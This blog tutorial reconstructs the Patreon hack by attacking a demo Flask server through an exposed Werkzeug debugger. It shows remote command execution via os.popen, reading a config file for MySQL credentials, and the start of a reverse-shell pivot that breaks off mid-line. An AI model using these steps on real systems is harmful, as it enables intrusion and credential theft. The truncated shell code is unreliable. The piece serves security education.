# Intro

In my [previous post in this series](http://raphael-enochian.tumblr.com/post/133000006820/go-ahead-expose-your-web-debugger-to-the), I gave a rundown on the Patreon hack. I analyzed the attack, security breaches, the source code, and the data dump. In this article, I will reconstruct and demonstrate the exploit itself used by the hackers by attacking  a demo [`Flask`](http://flask.pocoo.org/) server.

> **DISCLAIMER**: *Do not attempt to run this exploit against a server that you don't personally own, or explicitly have permission to do so. I am not liable for any damages or stupidity caused by this demo.*

## Some terms

* **Web framework** - Explaining this is a bit beyond the scope of this article, but an excellent explanation is here: [What is a Web Framework?](http://stackoverflow.com/a/4507543)
* **[`Flask`](http://flask.pocoo.org/)** - A web framework for building web applications with the Python programming language. It's extremely light-weight, small, modular and extensible, and is therefore called a *microframeworks*. Web microframeworks have been gaining a lot of traction in the past few years, over older monolithic frameworks like `Ruby on Rails` and `Django`. Other popular examples of web microframeworks include `Sinatra` (Ruby) and `Node.js` (JavaScript). Flask well established in the web developer community, powering either wholly or partially many popular websites: Pinterest, Twilio, Linked-In, Apple, and Obama's 2012 Election website.
* **[`Werkzeug`](http://werkzeug.pocoo.org/)** - the utility library for Flask that is used (or should be used) only in the development environment. It comes with a powerful in-browser debugger, and has services for hosting a local development web server.

## Setting the Stage

This exploit uses the `Werkzeug` version 0.9.6 -- the same version of Werkzeug running on the Patreon servers (according to the source code dump's `venv` directory). This hack may not work on newer version of `Werkzeug`, which has since been updated with some security changes, like a debugger PIN code ([changelog for Werkzeug 0.11](https://github.com/mitsuhiko/werkzeug/blob/master/CHANGES] ), line 54).

Let's begin by creating a basic Flask app with two endpoints: `index` and `error`.

`my-flask-app.py`

    from flask import Flask
    app = Flask(__name__)

    @app.route('/')
    def index():
        return "Hello, hacker!"

    @app.route('/error')
    def my_error():
        return 3 / 0

    app.run(debug=True, port=7777)

Next, we run the server.

    $ python my-flask-app.py
     * Running on http://127.0.0.1:7777/
     * Restarting with reloader

We now have a fully-fledged Flask application running with a WSGI server.

Open up a web browser and navigate to `http://127.0.0.1:7777`

![Working flask server](./first-hello-world.png)

## Enter Werkzeug Debugger
Because we specified the `debug=True` flag at runtime, the Werkzeug debugger is now active. That means, if any errors occur server-side, the powerful Werkzeug debugger is exposed. There are some scenarios when may occur:

 * Faulty server-side code
 * Unhandled exceptions
 * Environment or other state that the server-side code assumes has changed
 * Client-side intervention by passing faulty data that the app doesn't know how to handle (or again, unhandled exceptions)

All's said and done, it's just best practice to simply **disable** the Werkzeug debugger when the server goes live -- for whatever reason, Patreon didn't.

For simplicity's sake, we'll be invoking by faulty server-side code in order to invoke the Werkzeug debugger. When the user navigates to the `error` endpoint, the server will try to divide 3 by 0, raising a `ZeroDivisionError`.

It's pretty powerful though, potentially useful for a developer:

![Werkzeug](./second-werkzeug.png)

As you can see, Werkzeug allows you to open up an **interactive shell** right there in the browser. This shell has the ability to run arbitrary code against a Python interpreter, and has access to all the underlying server and system information.

## Remote Code Execution inside the browser

When your application exposes the ability for the end-user to inject arbitrary code, it's **game over**. I could just call it a day right here, but let's continue in our exploitation.

![](./third-werkzeug.png)
And we can run arbitrary code indeed. Here I've imported the `os` module, which allowed you to inspect and manipulate the underlying system. I then invoked a command to view all of the environment variables, thereby exposing details about the username, the shell, the system, etc. You can also use the `os` module to run commands directly against the system:

    >>> cmd_output = os.popen('ls -la').read()
    >>> print(cmd_output)
    my-flask-app.py
    server.conf


At this point, provided you know some basic Python, or how to do a Google search by Python commands, it's *trivial* to exploit this system.

But first, let's simplify our *remote code execution* by defining a `lambda`, so we're not typing `os.popen(<command>).read()` every time. Make sure to send your command as a `string`.

    >>> rex = lambda cmd, os=os: print(os.popen(cmd).read())
    >>> rex('uname -a')
    Linux my-computer 4.2.5-1-ARCH #1 SMP PREEMPT Tue Oct 27 08:13:28 CET 2015 x86_64 GNU/Linux

Cool. The lambda works.
Now we want to find the login credentials to access the MySQL database, in order to get all of the user data. We by inspecting that shiney `server.conf`files we saw when we first invoked `ls`.

    >>> rex('cat server.conf')
    PROJECT_NAME = 'My Flask App'
    SQLALCHEMY_DATABASE_URI = 'mysql://root:root@10.0.2.15:3306/my_flask_app'

`SQLALCHEMY_DATABASE_URI` is a connection string that the Flask app uses to connect to its database. This connection string has all the information we need to get unauthorized access to the MySQL server: username, password, IP address, port, and database name.

Let me just pause right here and say that it's a **terrible** practice to store your passwords and configuration files in plaintext. Had Patreon encrypted their configuration files, there's a good chance the hackers wouldn't have gained access to the MySQL database (and user info), and the hack would have stopped right here.

## Reverse Shell through Werkzeug Debugger, and pivot

Let's assume Patreon's database as actually inside some internal network that isn't exposed to the public Internet: `10.0.2.15` At this point we do what's known as **pivoting** -- using a compromised machine to attack another machine.

First, let's enter into a persistent interactive BASH session.

    >>> rex('which bash')
    /usr/bin/bash
    >>> import subprocess
    >>> p = sub


## Final thoughts
Do realize that all of these steps above can be automated, meaning any scriptkiddie with `Metasploit`, or any bot, can perform these.

Don't expose your debugger in production!
